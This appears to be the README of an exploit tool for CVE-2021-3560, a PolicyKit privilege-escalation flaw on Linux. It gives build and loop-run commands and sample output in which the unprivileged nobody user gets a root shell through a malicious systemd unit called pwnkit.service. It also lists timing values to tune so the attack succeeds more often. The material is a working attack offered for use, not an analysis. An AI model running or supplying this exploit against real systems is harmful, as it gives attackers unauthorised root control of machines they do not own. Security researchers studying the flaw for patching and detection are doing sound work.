PolicyKit CVE-2021-3560 Exploitation (Authentication Agent)
====

Blog posts about this exploitation: 
- https://ricterz.me/posts/2022-04-28-a-new-exploitation-way-for-cve-2021-3560-polkit-linux-privilege-escalation.txt
- http://noahblog.360.cn/a-new-exploitation-way-for-cve-2021-3560-policykit-linux-privilege-escalation

### Usage
```
nobody@test:/tmp/CVE-2021-3560$ go build
nobody@test:/tmp/CVE-2021-3560$ while [ 1 ]; do ./CVE-2021-3560 pwnkit.service; pwned -p; done
[*] Registering PolicyKit authentication agent ...
[*] Registering PolicyKit authentication agent ...
[*] Authentication agent main loop running ...
[*] Authentication agent main loop running ...
[*] Enabling systemd unit file '/tmp/pwnkit.service' ...
[*] Starting systemd service 'pwnkit.service' ...
[+] Received authentication request
- Cookie: 206-e229626882f64d50217671bfb43f1e79-1-007a116a258241fa78da4658534376bf
- Action ID: org.freedesktop.systemd1.manage-unit-files
[+] Received authentication request
- Cookie: 207-9d1bd4cadf079f93ecb708d13b3e1b25-1-59e98e84ad54c1821a20d2f3c84172a8
- Action ID: org.freedesktop.systemd1.manage-units
Killed

pwned-5.0# id
uid=65534(nobody) gid=65534(nogroup) euid=0(root) egid=0(root) groups=0(root),65534(nogroup)
```

### Notice
For difference environments, change follow values may improve the successful rate:

- [agent.py#47](agent.go#L47): `time.Sleep(time.Millisecond * 10)`
- [agent.py#59](agent.go#L58): `time.Sleep(time.Millisecond * 1)`
